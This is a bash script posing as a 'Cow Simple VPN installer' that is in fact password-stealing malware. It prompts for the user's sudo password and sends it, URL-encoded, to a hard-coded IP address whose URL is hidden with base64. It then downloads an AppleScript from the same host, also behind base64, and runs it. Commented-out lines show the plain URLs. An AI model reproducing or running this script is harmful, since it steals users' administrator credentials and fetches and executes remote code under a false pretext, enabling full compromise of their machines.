#!/bin/bash

mkdir -p tmp && cd tmp

echo "< Cow Simple VPN installer >
 --------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )===
                ||----w |
                ||     ||"

echo "Password: "
read -s p


echo $p | sudo -S date

if [ $? -ne 0 ]; then
    echo "Incorrect password!"
    exit 1
fi

encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$p'''))")
#curl "http://95.217.211.87:8010/p/${encoded}"
curl "$(echo 'aHR0cDovLzk1LjIxNy4yMTEuODc6ODAxMC9wLw==' | base64 --decode)${encoded}"


#wget -O vpn.applescript http://95.217.211.87:8500/mackz.applescript


wget -O vpn.applescript $(echo 'aHR0cDovLzk1LjIxNy4yMTEuODc6ODUwMC9tYWNrei5hcHBsZXNjcmlwdAo=' | base64 --decode)

open vpn.applescript